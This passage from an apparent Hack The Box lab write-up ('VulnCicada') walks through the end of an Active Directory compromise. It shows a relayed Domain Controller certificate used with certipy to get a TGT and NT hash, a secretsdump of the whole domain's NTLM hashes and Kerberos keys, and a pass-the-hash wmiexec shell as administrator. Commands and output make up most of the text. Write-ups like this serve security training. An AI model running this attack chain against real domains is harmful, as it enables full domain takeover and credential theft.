COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, efsrpc\EfsRpcAddUsersToFile
```

This time everything falls into place.

![relayAttack](/images/vulncicada/relayAttack.png)

The relay succeeds, and the Certificate Authority issues me a valid **Domain Controller certificate**. Exactly what I was hoping for.

### Becoming the Domain Controller

Now that I possess the Domain Controller's certificate, I can authenticate as the machine account itself.


```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ sudo certipy-ad auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48               ──(Mon,Jul06)─┘
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

Certipy uses the certificate to request a **Kerberos Ticket Granting Ticket (TGT)** for the Domain Controller account and saves it as a credential cache.

I export the ticket into my current shell.

A quick `klist` confirms I'm now holding a valid Kerberos ticket for:
```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ export KRB5CCNAME=dc-jpq225.ccache                                         ──(Mon,Jul06)─┘
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ klist                                                                      ──(Mon,Jul06)─┘
Ticket cache: FILE:dc-jpq225.ccache
Default principal: dc-jpq225$@CICADA.VL

Valid starting       Expires              Service principal
07/06/2026 11:52:07  07/06/2026 21:52:07  krbtgt/CICADA.VL@CICADA.VL
        renew until 07/07/2026 11:51:47
```

At this point, I'm effectively authenticated as the Domain Controller itself.

### Dumping the Domain

With the Domain Controller's Kerberos ticket loaded, dumping the Active Directory database is trivial.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ secretsdump.py -k -no-pass dc-jpq225.cicada.vl                             ──(Mon,Jul06)─┘
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::
cicada.vl\Shirley.West:1104:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
cicada.vl\Jordan.Francis:1105:aad3b435b51404eeaad3b435b51404ee:f5caf661b715c4e1435dfae92c2a65e3:::
cicada.vl\Jane.Carter:1106:aad3b435b51404eeaad3b435b51404ee:7e133f348892d577014787cbc0206aba:::
cicada.vl\Joyce.Andrews:1107:aad3b435b51404eeaad3b435b51404ee:584c796cd820a48be7d8498bc56b4237:::
cicada.vl\Daniel.Marshall:1108:aad3b435b51404eeaad3b435b51404ee:8cdf5eeb0d101559fa4bf00923cdef81:::
cicada.vl\Rosie.Powell:1109:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
cicada.vl\Megan.Simpson:1110:aad3b435b51404eeaad3b435b51404ee:6e63f30a8852d044debf94d73877076a:::
cicada.vl\Katie.Ward:1111:aad3b435b51404eeaad3b435b51404ee:42f8890ec1d9b9c76a187eada81adf1e:::
cicada.vl\Richard.Gibbons:1112:aad3b435b51404eeaad3b435b51404ee:d278a9baf249d01b9437f0374bf2e32e:::
cicada.vl\Debra.Wright:1113:aad3b435b51404eeaad3b435b51404ee:d9a2147edbface1666532c9b3acafaf3:::
DC-JPQ225$:1000:aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
krbtgt:aes256-cts-hmac-sha1-96:ed5b82d607535668e59aa8deb651be5abb9f1da0d31fa81fd24f9890ac84693d
krbtgt:aes128-cts-hmac-sha1-96:9b7825f024f21e22e198e4aed70ff8ea
krbtgt:des-cbc-md5:2a768a9e2c983e31
cicada.vl\Shirley.West:aes256-cts-hmac-sha1-96:3f3657fb6f0d441680e9c5e0c104ef4005fa5e79b01bbeed47031b04a913f353
cicada.vl\Shirley.West:aes128-cts-hmac-sha1-96:cd16a8664de29a4e8bd9e8b492f3eef9
cicada.vl\Shirley.West:des-cbc-md5:abbf341664bafe76
cicada.vl\Jordan.Francis:aes256-cts-hmac-sha1-96:ec8aaa2c9432ed3b0d2834e4e24dc243ec8d77ec3488101e79d1b2cc1c2ee6ea
cicada.vl\Jordan.Francis:aes128-cts-hmac-sha1-96:0b551142246edc108a92913e46852404
cicada.vl\Jordan.Francis:des-cbc-md5:a2e53d6ea44ab6e9
cicada.vl\Jane.Carter:aes256-cts-hmac-sha1-96:bb04095d1884439b825a5606dd43aadfd2a8fad1386b3728b9bad582efd5d4aa
cicada.vl\Jane.Carter:aes128-cts-hmac-sha1-96:8a27618e7036a49fb6e371f2e7af649e
cicada.vl\Jane.Carter:des-cbc-md5:340eda8962cbadce
cicada.vl\Joyce.Andrews:aes256-cts-hmac-sha1-96:7ca8317638d429301dfbb88af701fadffbc106d31f79a4de7e8d35afbc2d30c4
cicada.vl\Joyce.Andrews:aes128-cts-hmac-sha1-96:6ec2495dea28c09cf636dd8b080012fd
cicada.vl\Joyce.Andrews:des-cbc-md5:6bf2b6f21fcda258
cicada.vl\Daniel.Marshall:aes256-cts-hmac-sha1-96:fcccb590bac0a888898461247fbb3ee28d282671d8491e0b0b83ac688c2a29d6
cicada.vl\Daniel.Marshall:aes128-cts-hmac-sha1-96:80a3b053500586eefd07d32fc03e3849
cicada.vl\Daniel.Marshall:des-cbc-md5:e0fbdcb3c7e9f154
cicada.vl\Rosie.Powell:aes256-cts-hmac-sha1-96:54de41137f8d37d4a6beac1638134dfefa73979041cae3ffc150ebcae470fce5
cicada.vl\Rosie.Powell:aes128-cts-hmac-sha1-96:d01b3b63a2cde0d1c5e9e0e4a55529a4
cicada.vl\Rosie.Powell:des-cbc-md5:6e70b9a41a677a94
cicada.vl\Megan.Simpson:aes256-cts-hmac-sha1-96:cdb94aaf5b15465371cbe42913d652fa7e2a2e43afc8dd8a17fee1d3f142da3b
cicada.vl\Megan.Simpson:aes128-cts-hmac-sha1-96:8fd3f86397ee83ed140a52bdfa321df0
cicada.vl\Megan.Simpson:des-cbc-md5:587032806b5d19b6
cicada.vl\Katie.Ward:aes256-cts-hmac-sha1-96:829effafe88a0a5e17c4ccf1840f277327309b2902aeccc36625ac51b8e936bc
cicada.vl\Katie.Ward:aes128-cts-hmac-sha1-96:585264bc071354147db5b677be13506b
cicada.vl\Katie.Ward:des-cbc-md5:01801aa2e5755898
cicada.vl\Richard.Gibbons:aes256-cts-hmac-sha1-96:3c3beb85ec35003399e37ae578b90ae7a65b4ec7305e0ac012dbeaaa41bcbe22
cicada.vl\Richard.Gibbons:aes128-cts-hmac-sha1-96:646557f4143182bda5618f95429f3a49
cicada.vl\Richard.Gibbons:des-cbc-md5:834a675bd058efd0
cicada.vl\Debra.Wright:aes256-cts-hmac-sha1-96:26409e8cc8f3240501db7319bd8d8a2077d6b955a8f673b9ccf7d9086d3aec62
cicada.vl\Debra.Wright:aes128-cts-hmac-sha1-96:6a289ddd9a1a2196b671b4bbff975629
cicada.vl\Debra.Wright:des-cbc-md5:f25eb6a4265413cb
DC-JPQ225$:aes256-cts-hmac-sha1-96:01e2f9943c6c0c3f010dde6dddcae89cc81158e4f1c017e6fc34f85538d892b1
DC-JPQ225$:aes128-cts-hmac-sha1-96:87efc91730d07d819f58b4996e3fa04c
DC-JPQ225$:des-cbc-md5:6df208855d40dfcb
[*] Cleaning up...
```

The dump includes every account in the domain, including the **Administrator** NTLM hash.

Now I simply pass the hash to obtain a shell.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ wmiexec.py cicada.vl/administrator@dc-jpq225.cicada.vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] SMBv3.0 dialect used
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
cicada\administrator
```

From a forgotten sticky note on an NFS share to full **Domain Administrator** all because a Certificate Authority trusted an authentication request it never should have.





